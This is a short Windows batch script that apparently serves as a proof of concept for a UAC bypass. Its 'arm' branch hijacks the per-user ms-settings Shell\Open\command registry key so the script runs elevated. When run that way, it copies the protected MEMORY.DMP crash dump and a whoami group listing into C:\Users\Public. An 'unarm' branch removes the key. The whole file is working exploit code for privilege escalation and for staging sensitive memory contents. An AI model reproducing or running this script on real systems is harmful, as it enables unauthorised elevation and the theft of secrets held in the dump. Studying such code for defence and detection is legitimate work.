@echo off
if /i "%1"=="arm" goto arm
if /i "%1"=="unarm" goto unarm
copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h300_MEMORY.DMP >nul 2>&1
whoami /groups /fo list > C:\Users\Public\h300_elevated.txt 2>&1
goto :eof
:arm
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h300.cmd /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg query "HKCU\Software\Classes\ms-settings\Shell\Open\command"
goto :eof
:unarm
reg delete "HKCU\Software\Classes\ms-settings" /f
reg query "HKCU\Software\Classes\ms-settings"
goto :eof
